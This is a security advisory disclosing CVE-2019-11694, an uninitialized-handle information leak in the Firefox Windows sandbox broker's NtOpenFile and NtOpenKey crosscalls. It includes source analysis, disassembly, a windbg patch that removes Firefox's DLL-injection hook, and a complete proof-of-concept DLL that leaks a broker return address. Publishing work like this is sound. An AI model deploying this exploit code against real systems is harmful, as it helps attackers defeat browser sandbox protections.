**Vulnerability summary**<br>
ll FilesystemDispatcher::NtOpenFile can leak an uninitialized handle value to a renderer due to an incorrect return value in FileSystemPolicy::OpenFileAction. The crosscall NtOpenKey seems to also suffer from the exact same bug.

In this advisory, we show how to leak a function pointer stored in the broker’s stack (corresponding, in this case, to a return address).

We’ll first have a glance at a crosscall implementation, from the renderer to the broker. Then, we’ll explain where the bug lies before eventually explaining how to trigger the bug and find a way to disclose a function pointer.

**Vendor Response**<br>
Firefox has released version 67 to address this issue, additional information can be obtained from: https://www.mozilla.org/en-US/security/advisories/mfsa2019-13/#CVE-2019-11694

**CVE**<br>
CVE-2019-11694

**Credit**<br>
An independent Security Researcher, Jeremy Fetiveau (@__x86), has reported this vulnerability to SSD Secure Disclosure program.

**Affected systems**<br>
The bug is specific to the Windows implementation of the sandbox. Both `x86` and `x64` builds are affected.

**Vulnerability Details**<br>
Sandboxing:

On Windows, browsers usually have a sandbox where there is one main normally privileged process and several processes running at a lower privilege level. The basic idea is that every tab would execute in a restricted environment so that compromising this process would not give an attacker a complete access to its target’s machine. He would need to also evade the sandbox.

To implement that, browsers make use of different mechanisms provided by the operating system such as restricted tokens, low integrity levels, job objects or station/desktop isolation.

In order to be able to do operations, a renderer process will likely have to ask the broker to do it for him using an IPC mechanism.

When trying to do system calls, a renderer might instead do what is called a crosscall. This means that instead of directly making a system call, a renderer will send a message asking the broker to do it for him. Depending on the policy, the broker may or may not execute the system call and send the result back to the renderer, through IPC.

Crosscalls:

When setting up the sandbox, renderer-side functions in ntdll like `ntdll!NtCreateFile` are hooked so as to redirect execution to the interception functions implementing the crosscall. Those functions write data in memory and signal the broker to make a crosscall.

Then, the broker executes dispatcher functions that does the actual syscall and sends the result back to the renderer through shared memory.

If we’ll take the case of `ntdll!NtCreateFile`, the renderer will actually end up executing `TargetNtCreateFile`. What is does is the following:
1. Call the original syscall
2. If the resulting `NTSTATUS` code is either `STATUS_ACCESS_DENIED` or `STATUS_NETWORK_OPEN_RESTRICTION`
3. Validate parameters
4. Prepare shared memory
5. Send a signal to actually make the crosscall using the function `CrossCall`

```c
// source/security/sandbox/chromium/sandbox/win/src/filesystem_interception.cc
NTSTATUS WINAPI TargetNtCreateFile(NtCreateFileFunction orig_CreateFile,
                                   PHANDLE file, ACCESS_MASK desired_access,
                                   POBJECT_ATTRIBUTES object_attributes,
                                   PIO_STATUS_BLOCK io_status,
                                   PLARGE_INTEGER allocation_size,
                                   ULONG file_attributes, ULONG sharing,
                                   ULONG disposition, ULONG options,
                                   PVOID ea_buffer, ULONG ea_length) {
  // Check if the process can open it first.
  NTSTATUS status = orig_CreateFile(file, desired_access, object_attributes,
                                    io_status, allocation_size,
                                    file_attributes, sharing, disposition,
                                    options, ea_buffer, ea_length);
  if (STATUS_ACCESS_DENIED != status &&
      STATUS_NETWORK_OPEN_RESTRICTION != status)
    return status;

  mozilla::sandboxing::LogBlocked("NtCreateFile",
                                  object_attributes->ObjectName->Buffer,
                                  object_attributes->ObjectName->Length);

  // We don't trust that the IPC can work this early.
  if (!SandboxFactory::GetTargetServices()->GetState()->InitCalled())
    return status;

  wchar_t* name = NULL;
  do {
    if (!ValidParameter(file, sizeof(HANDLE), WRITE))
      break;
    if (!ValidParameter(io_status, sizeof(IO_STATUS_BLOCK), WRITE))
      break;

    void* memory = GetGlobalIPCMemory();
    if (NULL == memory)
      break;

    uint32_t attributes = 0;
    NTSTATUS ret = AllocAndCopyName(object_attributes, &name, &attributes,
                                    NULL);
    if (!NT_SUCCESS(ret) || NULL == name)
      break;

    uint32_t desired_access_uint32 = desired_access;
    uint32_t options_uint32 = options;
    uint32_t disposition_uint32 = disposition;
    uint32_t broker = FALSE;
    CountedParameterSet<OpenFile> params;
    params[OpenFile::NAME] = ParamPickerMake(name);
    params[OpenFile::ACCESS] = ParamPickerMake(desired_access_uint32);
    params[OpenFile::DISPOSITION] = ParamPickerMake(disposition_uint32);
    params[OpenFile::OPTIONS] = ParamPickerMake(options_uint32);
    params[OpenFile::BROKER] = ParamPickerMake(broker);

    SharedMemIPCClient ipc(memory);
    CrossCallReturn answer = {0};
    // The following call must match in the parameters with
    // FilesystemDispatcher::ProcessNtCreateFile.
    ResultCode code = CrossCall(ipc, IPC_NTCREATEFILE_TAG, name, attributes,
                                desired_access_uint32, file_attributes, sharing,
                                disposition, options_uint32, &answer);
    if (SBOX_ALL_OK != code)
      break;

    status = answer.nt_status;

    if (!NT_SUCCESS(answer.nt_status))
      break;

    __try {
      *file = answer.handle;
      io_status->Status = answer.nt_status;
      io_status->Information = answer.extended[0].ulong_ptr;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
      break;
    }
    mozilla::sandboxing::LogAllowed("NtCreateFile",
                                    object_attributes->ObjectName->Buffer,
                                    object_attributes->ObjectName->Length);
  } while (false);

  if (name)
    operator delete(name, NT_ALLOC);

  return status;
}
```

After the renderer called `CrossCall` so as to make an `NtCreateFile` crosscall, the broker is going to execute the function `FilesystemDispatcher::NtCreateFile`.

After a few checks and evaluating the low level policy, it will eventually call the `FileSystemPolicy::CreateFileAction`. This is where the actual syscall will be made.

```c
// source/security/sandbox/chromium/sandbox/win/src/filesystem_dispatcher.cc
bool FilesystemDispatcher::NtCreateFile(IPCInfo* ipc,
                                        base::string16* name,
                                        uint32_t attributes,
                                        uint32_t desired_access,
                                        uint32_t file_attributes,
                                        uint32_t share_access,
                                        uint32_t create_disposition,
                                        uint32_t create_options) {
  if (!PreProcessName(name)) {
    // The path requested might contain a reparse point.
    ipc->return_info.nt_status = STATUS_ACCESS_DENIED;
    return true;
  }

  const wchar_t* filename = name->c_str();

  uint32_t broker = TRUE;
  CountedParameterSet<OpenFile> params;
  params[OpenFile::NAME] = ParamPickerMake(filename);
  params[OpenFile::ACCESS] = ParamPickerMake(desired_access);
  params[OpenFile::DISPOSITION] = ParamPickerMake(create_disposition);
  params[OpenFile::OPTIONS] = ParamPickerMake(create_options);
  params[OpenFile::BROKER] = ParamPickerMake(broker);

  // To evaluate the policy we need to call back to the policy object. We
  // are just middlemen in the operation since is the FileSystemPolicy which
  // knows what to do.
  EvalResult result = policy_base_->EvalPolicy(IPC_NTCREATEFILE_TAG,
                                               params.GetBase());

  // If the policies forbid access (any result other than ASK_BROKER),
  // then check for user-granted access to file.
  if (ASK_BROKER != result &&
      mozilla::sandboxing::PermissionsService::GetInstance()->
        UserGrantedFileAccess(ipc->client_info->process_id, filename,
                              desired_access, create_disposition)) {
    result = ASK_BROKER;
  }

  HANDLE handle;
  ULONG_PTR io_information = 0;
  NTSTATUS nt_status;
  if (!FileSystemPolicy::CreateFileAction(result, *ipc->client_info, *name,
                                          attributes, desired_access,
                                          file_attributes, share_access,
                                          create_disposition, create_options,
                                          &handle, &nt_status,
                                          &io_information)) {
    ipc->return_info.nt_status = STATUS_ACCESS_DENIED;
    return true;
  }
  // Return operation status on the IPC.
  ipc->return_info.extended[0].ulong_ptr = io_information;
  ipc->return_info.nt_status = nt_status;
  ipc->return_info.handle = handle;
  return true;
}
```

Here, `NtCreateFileInTarget` will do the actual system call.

```c
// source/security/sandbox/chromium/sandbox/win/src/filesystem_policy.cc
bool FileSystemPolicy::CreateFileAction(EvalResult eval_result,
                                        const ClientInfo& client_info,
                                        const base::string16& file,
                                        uint32_t attributes,
                                        uint32_t desired_access,
                                        uint32_t file_attributes,
                                        uint32_t share_access,
                                        uint32_t create_disposition,
                                        uint32_t create_options,
                                        HANDLE* handle,
                                        NTSTATUS* nt_status,
                                        ULONG_PTR* io_information) {
  // The only action supported is ASK_BROKER which means create the requested
  // file as specified.
  if (ASK_BROKER != eval_result) {
    *nt_status = STATUS_ACCESS_DENIED;
    return false;
  }
  IO_STATUS_BLOCK io_block = {};
  UNICODE_STRING uni_name = {};
  OBJECT_ATTRIBUTES obj_attributes = {};
  SECURITY_QUALITY_OF_SERVICE security_qos = GetAnonymousQOS();

  InitObjectAttribs(file, attributes, NULL, &obj_attributes,
                    &uni_name, IsPipe(file) ? &security_qos : NULL);
  *nt_status = NtCreateFileInTarget(handle, desired_access, &obj_attributes,
                                    &io_block, file_attributes, share_access,
                                    create_disposition, create_options, NULL,
                                    0, client_info.process);

  *io_information = io_block.Information;
  return true;
}
```

Let’s compare both `OpenFileAction` to `CreateFileAccess`

```c
// source/security/sandbox/chromium/sandbox/win/src/filesystem_policy.cc
bool FileSystemPolicy::OpenFileAction(EvalResult eval_result,
                                      const ClientInfo& client_info,
                                      const base::string16& file,
                                      uint32_t attributes,
                                      uint32_t desired_access,
                                      uint32_t share_access,
                                      uint32_t open_options,
                                      HANDLE* handle,
                                      NTSTATUS* nt_status,
                                      ULONG_PTR* io_information) {
  // The only action supported is ASK_BROKER which means open the requested
  // file as specified.
  if (ASK_BROKER != eval_result) {
    *nt_status = STATUS_ACCESS_DENIED;
    return true; // this line is different!
  }
  // An NtOpen is equivalent to an NtCreate with FileAttributes = 0 and
  // CreateDisposition = FILE_OPEN.
  IO_STATUS_BLOCK io_block = {};
  UNICODE_STRING uni_name = {};
  OBJECT_ATTRIBUTES obj_attributes = {};
  SECURITY_QUALITY_OF_SERVICE security_qos = GetAnonymousQOS();

  InitObjectAttribs(file, attributes, NULL, &obj_attributes,
                    &uni_name, IsPipe(file) ? &security_qos : NULL);
  *nt_status = NtCreateFileInTarget(handle, desired_access, &obj_attributes,
                                    &io_block, 0, share_access, FILE_OPEN,
                                    open_options, NULL, 0,
                                    client_info.process);

  *io_information = io_block.Information;
  return true;
}
```

In `OpenFileAction`, the following code is incorrect:

```c
if (ASK_BROKER != eval_result) {
    *nt_status = STATUS_ACCESS_DENIED;
    return true;
}
```

The return value should be `false` instead of `true`.

`OpenFileAction` is called by the `FilesystemDispatcher::NtOpenFile` crosscall as follows:

```c
bool FilesystemDispatcher::NtOpenFile(IPCInfo* ipc,
                                      base::string16* name,
                                      uint32_t attributes,
                                      uint32_t desired_access,
                                      uint32_t share_access,
                                      uint32_t open_options) {
  // [...]
  HANDLE handle; // not initialized
  ULONG_PTR io_information = 0;
  NTSTATUS nt_status;
  // can bail out early without modifying handle and while also returning true
  if (!FileSystemPolicy::OpenFileAction(result, *ipc->client_info, *name,
                                        attributes, desired_access,
                                        share_access, open_options, &handle,
                                        &nt_status, &io_information)) {
    ipc->return_info.nt_status = STATUS_ACCESS_DENIED;
    return true;
  }
  // Return operation status on the IPC.
  ipc->return_info.extended[0].ulong_ptr = io_information;
  ipc->return_info.nt_status = nt_status;
  ipc->return_info.handle = handle; // handle can be uninitialized here
  return true;
}
```

When the condition `ASK_BROKER != eval_result` is `true`, access to the file is denied and the broker should then execute.

```c
ipc->return_info.nt_status = STATUS_ACCESS_DENIED;
return true;
```

But as we saw previously, that is not case and we would therefore execute the following code:

```c
ipc->return_info.extended[0].ulong_ptr = io_information;
ipc->return_info.nt_status = nt_status;
ipc->return_info.handle = handle;
```

`io_information` is set to 0 and `nt_status` would be set to `STATUS_ACCESS_DENIED`.

However the handle is not initialized! Therefore, the broker will put some uninitialized stack memory in the shared memory when executing `ipc->return_info.handle = handle`

**Triggering the bug**<br>
Long story short, to trigger the bug, you only need to make an `NtOpenFile` crosscall on a file for which access would be denied.

It is required to manually read the shared memory or do the call to `CrossCall` directly because `TargetNtOpenFile` checks `answer.nt_status` and does not fetch shared memory the `nt_status` is an error code (which is what we expect). The line `*file = answer.handle;` would not get executed.

But as this is renderer code, you can do whatever you want. Either call `CrossCall` (or make your own) or scan the shared memory.

```c
ResultCode code = CrossCall(ipc, IPC_NTOPENFILE_TAG, name, attributes,
                                desired_access_uint32, sharing, options_uint32,
                                &answer);
    if (SBOX_ALL_OK != code)
      break;

    status = answer.nt_status;

    if (!NT_SUCCESS(answer.nt_status)) // (renderer side) nt_status != NT_SUCCESS
      break;

    __try {
      *file = answer.handle; // here you would fetch the leaked data from the shared memory
      io_status->Status = answer.nt_status;
      io_status->Information = answer.extended[0].ulong_ptr;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
      break;
}
```

The trigger would roughly look like this.

```c
RtlInitUnicodeString(&filename, L"\\??\\C:\\");
InitializeObjectAttributes(&obj_attr, &filename, OBJ_CASE_INSENSITIVE, NULL, NULL);
NtOpenFile(&file, FILE_WRITE_DATA, &obj_attr, &iostatusblock, 1, NULL);
```

**Getting a function pointer**<br>
We need to make sure that the stack contains something interesting. If you try to open the file `L"\\??\\C:\\secret\\canttouchme.txt"`, you would not get anything interesting. The return handle would actually be the number of characters of the file name (in this case, 0x1D).

Indeed, when receiving the signal for a crosscall, the broker would first execute the function `sandbox::SharedMemIPCServer::InvokeCallback`.

```c
bool SharedMemIPCServer::InvokeCallback(const ServerControl* service_context,
                                        void* ipc_buffer,
                                        CrossCallReturn* call_result) {
// [...]
  if (!GetArgs(params.get(), &ipc_params, args))
    return false;
// [...]
  if (handler) {
    switch (params->GetParamsCount()) {
// [...]
      case 7: {
        Dispatcher::Callback7 callback =
            reinterpret_cast<Dispatcher::Callback7>(callback_generic);
        if (!(handler->*callback)(&ipc_info, args[0], args[1], args[2], args[3],
                                  args[4], args[5], args[6]))
          break;
        error = false;
        break;
      }
// [...]
}
```

The function `GetArgs` will fetch the arguments from the shared memory. For every argument, it will call a function `GetRawParameterXXX`. Henceforth, when fetching the filename parameter, `GetParameterStr` will get called.

```c
// Fills up the list of arguments (args and ipc_params) for an IPC call.
bool GetArgs(CrossCallParamsEx* params, IPCParams* ipc_params,
             void* args[kMaxIpcParams]) {
  // [...]
  for (uint32_t i = 0; i < params->GetParamsCount(); i++) {
    uint32_t size;
    ArgType type;
    args[i] = params->GetRawParameter(i, &size, &type);
    if (args[i]) {
      ipc_params->args[i] = type;
      switch (type) {
        case WCHAR_TYPE: {
          std::unique_ptr<base::string16> data(new base::string16);
          if (!params->GetParameterStr(i, data.get())) {
            args[i] = 0;
            ReleaseArgs(ipc_params, args);
            return false;
          }
          args[i] = data.release();
          break;
        }
        // [...]
      }
    }
  }
  return true;
}
```

The code of `GetParameterStr` is the following:

```c
bool CrossCallParamsEx::GetParameterStr(uint32_t index,
                                        base::string16* string) {
 // [...]
  void* start = GetRawParameter(index, &size, &type);
 // [...]
  string->append(reinterpret_cast<wchar_t*>(start), size/(sizeof(wchar_t)));
  return true;
}bool CrossCallParamsEx::GetParameterStr(uint32_t index,
                                        base::string16* string) {
 // [...]
  void* start = GetRawParameter(index, &size, &type);
 // [...]
  string->append(reinterpret_cast<wchar_t*>(start), size/(sizeof(wchar_t)));
  return true;
}
```

If you’ll read the disassembly, you will find the following instructions:

```assembly
mov     ebx, [esi+14h]
mov     edx, [esi+10h]
mov     edi, eax
shr     edi, 1
mov     [ebp+var_18], ebx
sub     ebx, edx
cmp     ebx, edi
jnb     short loc_4162A0
```

Those instructions check if the length of the file name is greater than the length of the parameter string. When debugging, we can than see the original capacity of the string is of 7 characters. So we compare the number of characters of the file name to 7.

In the case of a greater string such as `L"\\??\\C:\\secret\\canttouchme.txt"``, the following basic block is executed.

```assembly
sub     esp, 10h
mov     al, [ebp+var_14]
mov     [esp+28h+var_24], al
mov     [esp+28h+var_20], ecx
mov     ecx, esi
mov     [esp+28h+var_1C], edi
mov     [esp+28h+same_address_as_the_uninitialized_handle], edi // look here!
call    std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t>>::_Reallocate_grow_by<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t>>::append(wchar_t const * const,uint)'::`1'::_lambda_1_,wchar_t const *,uint>(uint,`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t>>::append(wchar_t const * const,uint)'::`1'::_lambda_1_,wchar_t const *,uint)
jmp     short loc_416284
```

This will store the number of characters of the file name string. This is something an attacker does not want to happen because it is a completely irrelevant information.

But what happens if the string is smaller? A valid file name could be `L"\\??\\C:\\"``.

The following code will be executed instead:
```
loc_4162AD:
and     eax, 0FFFFFFFEh
lea     edx, [esi+edx*2]
push    eax             ; Size
push    ecx             ; Src
push    edx             ; Dst
call    _memmove // return address == uninitialized handle value
add     esp, 0Ch
```

This is a much better thing because it doesn’t write the string length on the address that will later correspond to the uninitialized handle.

Let’s do an `NtOpenFile` crosscall with the filename `L"\\??\\C:\\"` and use `FILE_WRITE_DATA` as a `DesiredAccessMask` like this: `NtOpenFileStruct(&file, FILE_WRITE_DATA, &obj_attrib, &io_status_block, 1, NULL);`

Now we will take a look at the leaking handle and we will see what to what it belongs when attaching to the broker process.

```
0:069> ln 002662bb
Browse module
Set bu breakpoint

*** WARNING: Unable to verify checksum for c:\mozilla-source\mozilla-central\obj-i686-pc-mingw32\dist\bin\firefox.exe
 [c:\mozilla-source\mozilla-central\security\sandbox\chromium\sandbox\win\src\crosscall_server.cc @ 293] (00266200)   firefox!sandbox::CrossCallParamsEx::GetParameterStr+0xbb   |  (002662d0)   firefox!sandbox::SetCallError
```

So basically, instead of leaking a string size, we leak a function pointer that corresponds to the return address pushed on the stack while executing the `_memmove` called by `GetParameterStr`.

This demonstrates that this bug does leak some sensitive information from the broker and that it is possible to get different kind of data by playing with the crosscall parameters.

**Testing the vulnerability**<br>
To play with the sandbox without using a renderer RCE bug, a simple way to do that is using reflective DLL injection. However, Firefox prevents that by hooking the function `kernel32!BaseThreadInitThunk`.

```
0:028> u KERNEL32!BaseThreadInitThunk
KERNEL32!BaseThreadInitThunk:
763e8460 e99bc87bde      jmp     mozglue!patched_BaseThreadInitThunk (54ba4d00)
763e8465 51              push    ecx
```

Therefore, simply patch the `JMP` by the standard `MOV EDI, EDI`.

```
KERNEL32!BaseThreadInitThunk:
763e8460 8bff            mov     edi,edi
763e8462 55              push    ebp
```

Looking at the dissassembly:

```
.text:00416A00                 mov     [ebp+__io_information], 0
.text:00416A07                 lea     edx, [ebp+phandle]
.text:00416A0A                 push    eax             ; unsigned int *
.text:00416A0B                 push    ecx             ; int *
.text:00416A0C                 push    edx             ; void **
.text:00416A0D                 push    [ebp+arg_14]    ; unsigned int
.text:00416A10                 push    [ebp+arg_10]    ; unsigned int
.text:00416A13                 push    [ebp+arg_C]     ; unsigned int
.text:00416A16                 push    [ebp+arg_8]     ; unsigned int
.text:00416A19                 push    [ebp+arg_4]     ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > *
.text:00416A1C                 push    dword ptr [edi] ; sandbox::ClientInfo *
.text:00416A1E                 push    esi             ; sandbox::EvalResult
.text:00416A1F                 call    sandbox::FileSystemPolicy::OpenFileAction(sandbox::EvalResult,sandbox::ClientInfo const &,std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t>> const &,uint,uint,uint,uint,void * *,long *,ulong *)
.text:00416A24                 add     esp, 28h
.text:00416A27                 mov     ecx, [ebp+arg_0]
.text:00416A2A                 test    al, al
.text:00416A2C                 jz      short loc_416A3D
.text:00416A2E                 mov     eax, [ebp+__io_information]
.text:00416A31                 mov     [ecx+1Ch], eax
.text:00416A34                 mov     ebx, [ebp+nt_status]
.text:00416A37                 mov     eax, [ebp+phandle]
.text:00416A3A                 mov     [ecx+18h], eax
```

```
public: static bool __cdecl sandbox::FileSystemPolicy::OpenFileAction(enum  sandbox::EvalResult, struct sandbox::ClientInfo const &, class std::basic_string<wchar_t, struct std::char_traits<wchar_t>, class std::allocator<wchar_t>> const &, unsigned int, unsigned int, unsigned int, unsigned int, void * *, long *, unsigned long *) proc near
.text:00418A20                                         ; CODE XREF: sandbox::FilesystemDispatcher::NtOpenFile(sandbox::IPCInfo *,std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t>> *,uint,uint,uint,uint)+11F↑p
.text:00418A20
.text:00418A20 var_4C          = dword ptr -4Ch
.text:00418A20 var_48          = dword ptr -48h
.text:00418A20 var_44          = dword ptr -44h
.text:00418A20 var_3C          = _OBJECT_ATTRIBUTES ptr -3Ch
.text:00418A20 var_24          = _UNICODE_STRING ptr -24h
.text:00418A20 var_1C          = dword ptr -1Ch
.text:00418A20 var_18          = dword ptr -18h
.text:00418A20 var_14          = dword ptr -14h
.text:00418A20 arg_0           = dword ptr  8
.text:00418A20 arg_4           = dword ptr  0Ch
.text:00418A20 arg_8           = dword ptr  10h
.text:00418A20 arg_C           = dword ptr  14h
.text:00418A20 arg_10          = dword ptr  18h
.text:00418A20 arg_14          = dword ptr  1Ch
.text:00418A20 arg_18          = dword ptr  20h
.text:00418A20 arg_1C          = dword ptr  24h
.text:00418A20 arg_20          = dword ptr  28h
.text:00418A20 arg_24          = dword ptr  2Ch
.text:00418A20
.text:00418A20                 push    ebp
.text:00418A21                 mov     ebp, esp
.text:00418A23                 push    ebx
.text:00418A24                 push    edi
.text:00418A25                 push    esi
.text:00418A26
.text:00418A26 eval_result:
.text:00418A26                 and     esp, 0FFFFFFF0h
.text:00418A29                 sub     esp, 40h
.text:00418A2C                 mov     ecx, ___security_cookie
.text:00418A32                 mov     eax, [ebp+arg_0]
.text:00418A35                 mov     edx, [ebp+arg_20]
.text:00418A38                 xor     ecx, ebp
.text:00418A3A                 cmp     eax, 3 // compare DENY_ACCESS to EVAL_BROKER
.text:00418A3D                 mov     [esp+4Ch+var_14], ecx
.text:00418A41                 jnz     loc_418AFF

[...]

.text:00418AFF loc_418AFF:                             ; CODE XREF: sandbox::FileSystemPolicy::OpenFileAction(sandbox::EvalResult,sandbox::ClientInfo const &,std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t>> const &,uint,uint,uint,uint,void * *,long *,ulong *)+21↑j
.text:00418AFF                 mov     dword ptr [edx], 0C0000022h
.text:00418B05
.text:00418B05 loc_418B05:                             ; CODE XREF: sandbox::FileSystemPolicy::OpenFileAction(sandbox::EvalResult,sandbox::ClientInfo const &,std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t>> const &,uint,uint,uint,uint,void * *,long *,ulong *)+DD↑j
.text:00418B05                 mov     ecx, [esp+4Ch+var_14]
.text:00418B09                 xor     ecx, ebp        ; cookie
.text:00418B0B                 call    __security_check_cookie(x)
.text:00418B10                 mov     al, 1
.text:00418B12                 lea     esp, [ebp-0Ch]
.text:00418B15                 pop     esi
.text:00418B16                 pop     edi
.text:00418B17                 pop     ebx
.text:00418B18                 pop     ebp
.text:00418B19                 retn
```

```c
enum EvalResult {
  // Comparison opcode values:
  EVAL_TRUE,   // Opcode condition evaluated true.
  EVAL_FALSE,  // Opcode condition evaluated false.
  EVAL_ERROR,  // Opcode condition generated an error while evaluating.
  // Action opcode values:
  ASK_BROKER,  // The target must generate an IPC to the broker. On the broker
               // side, this means grant access to the resource.
  DENY_ACCESS,   // No access granted to the resource.
  GIVE_READONLY,  // Give readonly access to the resource.
  GIVE_ALLACCESS,  // Give full access to the resource.
  GIVE_CACHED,  // IPC is not required. Target can return a cached handle.
  GIVE_FIRST,  // TODO(cpu)
  SIGNAL_ALARM,  // Unusual activity. Generate an alarm.
  FAKE_SUCCESS,  // Do not call original function. Just return 'success'.
  FAKE_ACCESS_DENIED,  // Do not call original function. Just return 'denied'
                       // and do not do IPC.
  TERMINATE_PROCESS,  // Destroy target process. Do IPC as well.
};
```

If the file we’re trying to open gets an `DENY_ACCESS` `EvalResult` instead of `ASK_BROKER`, the bug will be triggered. The disassembly shows that the handle will be uninitialized.

**Bug variants**<br>
The `NtOpenKey` dispatcher (broker side) contains the exact same bug and will also write an uninitialized `HANDLE` in the shared memory. Me might be able to leak different kind of information using this bug because the handle variable would be allocated at a different place on the stack.

```c
bool RegistryDispatcher::NtOpenKey(IPCInfo* ipc,
                                   base::string16* name,
                                   uint32_t attributes,
                                   HANDLE root,
                                   uint32_t desired_access) {
// [...]
  HANDLE handle; // not initialized
  NTSTATUS nt_status;
  if (!RegistryPolicy::OpenKeyAction(result, *ipc->client_info, *name,
                                     attributes, root, desired_access, &handle,
                                     &nt_status)) {
    ipc->return_info.nt_status = STATUS_ACCESS_DENIED;
    return true;
  }

  // Return operation status on the IPC.
  ipc->return_info.nt_status = nt_status;
  ipc->return_info.handle = handle; // may be uninitialized
  return true;
}
```

```c
bool RegistryPolicy::OpenKeyAction(EvalResult eval_result,
                                   const ClientInfo& client_info,
                                   const base::string16& key,
                                   uint32_t attributes,
                                   HANDLE root_directory,
                                   uint32_t desired_access,
                                   HANDLE* handle,
                                   NTSTATUS* nt_status) {
  // The only action supported is ASK_BROKER which means open the requested
  // file as specified.
  if (ASK_BROKER != eval_result) {
    *nt_status = STATUS_ACCESS_DENIED;
    return true; // should be balse, handle is not written
  }
// [...]
  return true;
}
```

**Exploit**<br>
The POC uses the reflective DLL injection tool from Stephen Fewer. https://github.com/stephenfewer/ReflectiveDLLInjection Simply change ReflectiveDll.c and Sandbox.h. Firefox prevents DLL injections by hooking `kernel32!BaseThreadInitThunk`. You can remove that using this windbg command: `eb kernel32!BaseThreadInitThunk 8b ff 55 8b ec`

In order to find IPC Shared Memory, the POC simply uses `OFFSET_TO_G_SHARED_IPC_MEMORY` as an offset between the firefox module base and `firefox!g_shared_IPC_memory`. Here is the exact version used for which the offset works.

`$ hg log -l 1`<br>
`changeset: 451842:8330fe920aea`

```c
/*
this is some code to trigger the uninitialized handle leak
it leaks stack memory from the broker
in this case, the leaked value used to be a return address
*/

#include "ReflectiveLoader.h"
#include "Sandbox.h"

#define OFFSET_TO_G_SHARED_IPC_MEMORY 0x000411c0
#define STATUS_ACCESS_DENIED          ((NTSTATUS)0xC0000022L)
#define IPC_NTOPENFILE_TAG 4

typedef unsigned int uint32_t;
typedef _Return_type_success_(return >= 0) LONG NTSTATUS;

typedef enum _ResultCode {
	SBOX_ALL_OK = 0,
	// Error is originating on the win32 layer. Call GetlastError() for more
	// information.
	SBOX_ERROR_GENERIC = 1,
	// An invalid combination of parameters was given to the API.
	SBOX_ERROR_BAD_PARAMS = 2,
	// The desired operation is not supported at this time.
	SBOX_ERROR_UNSUPPORTED = 3,
	// The request requires more memory that allocated or available.
	SBOX_ERROR_NO_SPACE = 4,
	// The ipc service requested does not exist.
	SBOX_ERROR_INVALID_IPC = 5,
	// The ipc service did not complete.
	SBOX_ERROR_FAILED_IPC = 6,
} ResultCode;

typedef struct _CrossCallReturn {
	uint32_t tag;
	ResultCode call_outcome;
	uint32_t padding; // to reflect the size of the actual structure!
	uint32_t padding2;
	union {
		NTSTATUS nt_status;
		DWORD    win32_result;
	};
	uint32_t extended_count;
	HANDLE handle;
} CrossCallReturn;

void doOpenFile() {
	NT_OPEN_FILE NtOpenFileStruct;
	_RtlInitUnicodeString __RtlInitUnicodeString;
	HMODULE  hModule = NULL;
	HANDLE file = NULL;
	UNICODE_STRING filename;
	OBJECT_ATTRIBUTES obja;
	IO_STATUS_BLOCK iostatusblock;

	hModule = LoadLibraryA("ntdll.dll");
	NtOpenFileStruct = (NT_OPEN_FILE)GetProcAddress(hModule, "NtOpenFile");
	__RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(hModule, "RtlInitUnicodeString");

	// we can't open C:\\
	// string length affects uninitialized memory
	__RtlInitUnicodeString(&filename, L"\\??\\C:\\");
	InitializeObjectAttributes(&obja, &filename, OBJ_CASE_INSENSITIVE, NULL, NULL);

	// trigger, go to TargetOpenFile
	NtOpenFileStruct(&file, FILE_WRITE_DATA, &obja, &iostatusblock, 1, NULL); // should trigger an access denied
}

PUINT32 getSharedIPCMemory() {
	unsigned long sharedMemory;
	sharedMemory = (unsigned long)GetModuleHandleA("firefox.exe");
	sharedMemory += OFFSET_TO_G_SHARED_IPC_MEMORY;
	sharedMemory = *(unsigned long*)sharedMemory;
	return sharedMemory;
}


UINT32 leakFromSandbox()
{
	PUINT32 sharedMemory;
	CrossCallReturn* ret = (CrossCallReturn*)malloc(sizeof(CrossCallReturn)*2);
	memset(ret, 0x41, sizeof(CrossCallReturn)*2);
	size_t i = 0;

	// trigger uninitialized handle leak

	doOpenFile();

	// look for firefox!g_shared_IPC_memory
	sharedMemory = getSharedIPCMemory();

	// scan shared memory (firefox!g_shared_IPC_size = 0x2000)
	// we look for a CrossCallReturn with
	// a STATUS_ACCESS_DENIED status
	// and an IPC_NTOPENFILE_TAG tag

	for (i = 0; i < (0x2000 / 4); ++i) {
		if (*sharedMemory == STATUS_ACCESS_DENIED) {
			memcpy(ret, sharedMemory - 4, sizeof(CrossCallReturn));
			if (ret->tag == IPC_NTOPENFILE_TAG) {

				// return what should be the handle but actually is
				// uninitialized broker stack memory

				return ret->handle;
			}
		}
		sharedMemory++;
	}
	return 0;
}

UINT32 testSandbox() {
	UINT32 leakedHandle = 0;

	// trigger the infoleak

	leakedHandle = leakFromSandbox();

	// now leakedHandle == firefox!sandbox::CrossCallParamsEx::GetParameterStr+0xbb
	// we just leaked uninitialized memory that use to contain a return address

	__asm int 3;
	return leakedHandle;
}

// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own
// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;
//===============================================================================================//
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	switch( dwReason )
    {
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			testSandbox();
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}
```

```c
#pragma once

#include <Windows.h>

